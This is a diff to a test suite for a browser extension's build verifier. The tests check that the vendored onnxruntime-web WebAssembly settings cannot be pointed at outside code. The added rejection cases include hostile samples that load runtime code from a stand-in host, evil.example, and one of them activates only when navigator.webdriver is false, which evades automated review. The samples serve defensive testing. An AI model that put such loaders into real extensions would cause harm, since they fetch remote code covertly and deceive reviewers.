@@ -9,10 +9,13 @@ import { findEsmSyntax, manifestPages, readBundleFiles, verifyDist } from '../..
 import { EXTENSION_PAGES } from '../../src/shared/constants';
 import { ALLOWED_MEDIA, MEDIA_SIGNATURES } from '../../scripts/lib/static-assets';
 import { expectedManifest } from '../../scripts/lib/expected-manifest';
+import { REAL_CHUNK } from './helpers/runtime-chunk';
 import { MEDIA_SAMPLES, PROTOTYPE_NAMES, withMedia } from './helpers/media';
 import type { BundleKind } from '../../vite.shared';
 
 const VERSION = '1.0.0';
+/** The chunk of src/result/model.ts, the one script that imports (and configures) the vendored runtime. */
+const BASE_CHUNK = 'assets/result-base0.js';
 const dirs: string[] = [];
 afterEach(() => {
   for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true });
@@ -59,6 +62,7 @@ function makeDist(
   const files: Record<string, string | Buffer> = {
     'manifest.json': JSON.stringify(options.patch ? options.patch(manifest) : manifest),
     'background.js': 'export {};',
+    [BASE_CHUNK]: REAL_CHUNK,
     'select.js': options.content ?? '(function(){})();',
     ...Object.fromEntries(Object.values(EXTENSION_PAGES).map((page) => [page, '<html></html>'])),
     '_locales/en/messages.json': '{}',
@@ -83,6 +87,7 @@ function makeDist(
 const MAIN: Record<string, BundleKind> = {
   'manifest.json': 'asset',
   'background.js': 'chunk',
+  [BASE_CHUNK]: 'chunk',
   ...Object.fromEntries([...VENDOR_BYTES.keys()].map((path) => [path, 'asset' as const])),
   ...Object.fromEntries(Object.values(EXTENSION_PAGES).map((page) => [page, 'asset' as const])),
 };
@@ -774,17 +779,24 @@ describe('verifyDist: the FontSnap manifest and its narrow WebAssembly exception
   // WebAssembly smuggled into a built script, or onnxruntime-web pointed at other code (review of PR #6): the build
   // must refuse it whatever the spelling; the pinned vendor files are exempt by exact path and sha256 only.
   describe('WebAssembly bytes and runtime settings in built scripts', () => {
-    const LEGIT =
-      'async function I(){o.env.wasm.wasmPaths=chrome.runtime.getURL("ort/"),o.env.wasm.numThreads=1}';
+    const LEGIT = REAL_CHUNK;
     const RESULT = 'assets/result-abc.js';
     const problemsOf = (files: Record<string, string>) =>
       verifyDist(
-        makeDist({ files }),
+        makeDist({ files, skip: [BASE_CHUNK] }),
         withMain(Object.fromEntries(Object.keys(files).map((file) => [file, 'chunk' as const]))),
       ).join('\n');
 
-    it('accepts the legitimate result chunk (wasmPaths set once from a call)', () => {
+    it('accepts the legitimate result chunk as terser emits it', () => {
       expect(problemsOf({ [RESULT]: LEGIT })).toBe('');
+    });
+
+    it('accepts it whatever its hash, but only one chunk may import the runtime', () => {
+      expect(problemsOf({ 'assets/result-zzz.js': LEGIT })).toBe('');
+      const two = problemsOf({ [RESULT]: LEGIT, 'assets/other-abc.js': LEGIT });
+      expect(two).toContain('imports the vendored runtime');
+      const none = problemsOf({ 'assets/x-abc.js': 'export const a=1;' });
+      expect(none).toContain('imports the vendored runtime');
     });
 
     it.each([
@@ -804,13 +816,31 @@ describe('verifyDist: the FontSnap manifest and its narrow WebAssembly exception
       ['a string URL', 'o.env.wasm.wasmPaths="https://cdn.example.com/ort/"'],
       ['an object', 'o.env.wasm.wasmPaths={wasm:"https://cdn.example.com/x.wasm",mjs:u}'],
       ['a second setting', `${LEGIT};${LEGIT}`],
+      [
+        'a decoded, environment-dependent string (the review of PR #6)',
+        LEGIT.replace(
+          '.wasm.wasmPaths=I()',
+          '.wasm.wasmPaths=decodeURI("getManifest"in chrome.runtime&&!navigator.webdriver?"%68ttps://evil.example/ort/":I())',
+        ),
+      ],
+      [
+        'a frozen object with a remote .wasm',
+        LEGIT.replace(
+          '.wasm.wasmPaths=I()',
+          '.wasm.wasmPaths=Object.freeze({mjs:I(),wasm:"https://evil.example/x"})',
+        ),
+      ],
+      ['any other call', LEGIT.replace('.wasm.wasmPaths=I()', '.wasm.wasmPaths=g()')],
     ])('rejects wasmPaths set from %s', (_name, code) => {
-      expect(problemsOf({ [RESULT]: code })).toContain('wasmPaths');
+      const rhs = code.startsWith('import') ? code : code;
+      expect(problemsOf({ [RESULT]: rhs })).toContain('wasmPaths');
     });
 
     it('rejects wasmPaths outside the result chunk, and wasmBinary anywhere', () => {
-      expect(problemsOf({ 'assets/welcome-abc.js': LEGIT })).toContain('wasmPaths');
-      expect(problemsOf({ 'background.js': LEGIT })).toContain('wasmPaths');
+      expect(problemsOf({ 'assets/welcome-abc.js': 'o.env.wasm.wasmPaths=I()' })).toContain(
+        'wasmPaths',
+      );
+      expect(problemsOf({ 'background.js': 'o.env.wasm.wasmPaths=I()' })).toContain('wasmPaths');
       expect(
         problemsOf({ [RESULT]: 'o.env.wasm.wasmBinary=await(await fetch(u)).arrayBuffer()' }),
       ).toContain('wasmBinary');
@@ -868,7 +898,10 @@ describe('verifyDist: the FontSnap manifest and its narrow WebAssembly exception
     it('accepts the vendored runtime imported from a chunk in assets/', () => {
       const files = { 'assets/result-abc.js': ORT_IMPORT };
       expect(
-        verifyDist(makeDist({ files }), withMain({ 'assets/result-abc.js': 'chunk' })),
+        verifyDist(
+          makeDist({ files, skip: [BASE_CHUNK] }),
+          withMain({ 'assets/result-abc.js': 'chunk' }),
+        ),
       ).toEqual([]);
     });
 
